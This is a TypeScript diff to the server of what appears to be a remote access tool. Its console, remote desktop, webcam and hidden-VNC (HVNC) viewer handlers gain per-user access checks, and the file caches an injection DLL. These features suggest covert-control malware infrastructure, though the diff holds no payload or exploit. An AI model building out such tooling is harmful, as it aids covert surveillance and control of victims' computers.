@@ -11,6 +11,7 @@ import { resolveRuntimeRoot } from "./runtime-paths";
 import * as sessionManager from "../sessions/sessionManager";
 import type { ConsoleSession, RemoteDesktopViewer, SocketData } from "../sessions/types";
 import type { ClientInfo } from "../types";
+import { canUserAccessClient } from "../users";
 
 let _cachedInjectionDll: Uint8Array | null = null;
 let _dllCachePath: string | null = null;
@@ -248,7 +249,11 @@ export function notifyConsoleClosed(clientId: string, reason: string) {
 }
 
 export function handleConsoleViewerOpen(ws: ServerWebSocket<SocketData>) {
-  const { clientId, sessionId } = ws.data;
+  const { clientId, sessionId, userId, userRole } = ws.data;
+  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
+    ws.close(1008, "Forbidden: client access denied");
+    return;
+  }
   const effectiveSessionId = sessionId || uuidv4();
   ws.data.sessionId = effectiveSessionId;
   const target = clientManager.getClient(clientId);
@@ -272,7 +277,11 @@ export function handleConsoleViewerOpen(ws: ServerWebSocket<SocketData>) {
 }
 
 export function handleRemoteDesktopViewerOpen(ws: ServerWebSocket<SocketData>) {
-  const { clientId } = ws.data;
+  const { clientId, userId, userRole } = ws.data;
+  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
+    ws.close(1008, "Forbidden: client access denied");
+    return;
+  }
   const sessionId = uuidv4();
   ws.data.sessionId = sessionId;
   const target = clientManager.getClient(clientId);
@@ -506,7 +515,11 @@ export const hvncStreamingState = new Map<string, { isStreaming: boolean; displa
 export const webcamStreamingState = new Map<string, { isStreaming: boolean; deviceIndex: number; fps: number; useMax: boolean; quality: number; codec: string }>();
 
 export function handleWebcamViewerOpen(ws: ServerWebSocket<SocketData>) {
-  const { clientId } = ws.data;
+  const { clientId, userId, userRole } = ws.data;
+  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
+    ws.close(1008, "Forbidden: client access denied");
+    return;
+  }
   const sessionId = uuidv4();
   ws.data.sessionId = sessionId;
   const target = clientManager.getClient(clientId);
@@ -641,7 +654,11 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
 }
 
 export function handleHVNCViewerOpen(ws: ServerWebSocket<SocketData>) {
-  const { clientId } = ws.data;
+  const { clientId, userId, userRole } = ws.data;
+  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
+    ws.close(1008, "Forbidden: client access denied");
+    return;
+  }
   const sessionId = uuidv4();
   ws.data.sessionId = sessionId;
   const target = clientManager.getClient(clientId);
